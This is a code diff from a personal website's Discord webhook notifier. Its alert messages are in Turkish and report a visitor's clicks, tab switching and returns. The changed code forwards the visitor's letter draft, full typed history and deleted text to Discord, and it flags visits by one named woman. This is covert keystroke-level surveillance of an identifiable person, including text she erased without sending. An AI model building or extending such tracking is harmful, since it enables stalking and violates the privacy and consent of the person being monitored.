@@ -167,18 +167,22 @@ export async function sendDiscordWebhook(
       title = eventType === 'letter_draft_abandoned' ? '⚠️ Mektup Yarım Bırakıldı / Sayfadan Ayrıldı' : '✍️ Canlı Mektup Taslağı Yazılıyor';
       color = 16478608; // Rose #fb7185
       description = eventType === 'letter_draft_abandoned' ? 'Ziyaretçi mektup yazarken sayfayı kapattı veya ayrıldı. En son yazılan metin aşağıdadır:' : 'Ziyaretçi mektup kutusuna yazı yazıyor:';
-    } else if (eventType === 'last_user_click') {
+    } else if (eventType === 'last_user_click' || eventType === 'secret_user_click') {
       title = `🖱️ Ziyaretçi Ekrana Tıkladı: ${data.clickType || 'Tıklama'}`;
-      color = 3801080; // Sky Blue
-      description = `Ziyaretçi sayfada bir yere tıkladı.\n🎯 **Tıklanan Eleman:** \`${data.targetElement || '-'}\`\n📍 **Koordinat:** \`${data.coordinates || '-'}\`\n🖱️ **Tıklama Tipi:** ${data.clickType || '-'}`;
+      color = 3801080; // Sky Blue #3a86ff
+      description = `🖱️ **Ziyaretçi ekranda bir yere tıkladı!**\n\n🎯 **Tıklanan Bölge:** \`${data.targetElement || 'Siyah Ekran'}\`\n📍 **Koordinat:** \`${data.coordinates || '-'}\`\n🖱️ **Tıklama Tipi:** ${data.clickType || 'Sol Tıklama'}`;
     } else if (eventType === 'last_user_keypress') {
       title = `⌨️ Ziyaretçi Klavyede Tuşa Bastı: "${data.key || data.pressed_key || '-'}"`;
       color = 3801080; // Sky Blue
       description = `Ziyaretçi klavyede bir tuşa bastı.\n🔤 **Basılan Tuş:** \`${data.key || data.pressed_key || '-'}\``;
     } else if (eventType === 'visitor_left_page' || eventType === 'last_page_abandoned') {
-      title = isAysenurVisit ? '🚪🌹 Ayşenur Sayfadan Ayrıldı / Sekmeyi Kapattı' : '🚪 Ziyaretçi Sayfadan Ayrıldı';
+      title = isAysenurVisit ? '🚪🌹 Ayşenur Sekmeyi Değiştirdi / Siteden Ayrıldı' : '🚪 Ziyaretçi Sekmeyi Değiştirdi / Siteden Ayrıldı';
       color = isAysenurVisit ? 14749257 : 9740472; // Crimson or Slate Gray
-      description = `Ziyaretçi /last sayfasından veya siteden ayrıldı.\n⏱️ **Sitede Kaldığı Süre:** ${data.duration || 'Bilinmiyor'}\n📍 **Terk Ettiği Yer:** ${data.stage || 'Bilinmiyor'}`;
+      description = `🚪 **Ziyaretçi sekmeyi değiştirdi, ekranı kapattı veya arka plana aldı!**\n\n⏱️ **Sitede Kaldığı Süre:** ${data.duration || 'Bilinmiyor'}\n📍 **Ayrıldığı Aşama:** ${data.stage || 'Siyah Ekran'}${data.letterText ? `\n✍️ **En Son Yazılan Metin:** "${data.letterText}"` : ''}${data.allTypedHistory ? `\n🔤 **Tüm Yazılanlar:** "${data.allTypedHistory}"` : ''}${data.deletedText ? `\n✂️ **Silinen Kısımlar:** "${data.deletedText}"` : ''}`;
+    } else if (eventType === 'visitor_returned_to_page') {
+      title = isAysenurVisit ? '🌹 🚪 Ayşenur Sekmeye Geri Dönüş Yaptı!' : '🚪 Ziyaretçi Sekmeye Geri Dönüş Yaptı!';
+      color = 3462041; // Emerald Green #34d399
+      description = `🚪 **Ziyaretçi sekmeyi tekrar açtı ve site yeniden ekranda görünür oldu!**\n\n📍 **Mevcut Aşama:** ${data.stage || 'Siyah Ekran'}`;
     } else if (eventType === 'last_first_scroll') {
       title = '📜 /last Sayfasında İlk Kaydırma Yapıldı (Çekmece Açıldı)';
       color = 3801080; // Sky Blue
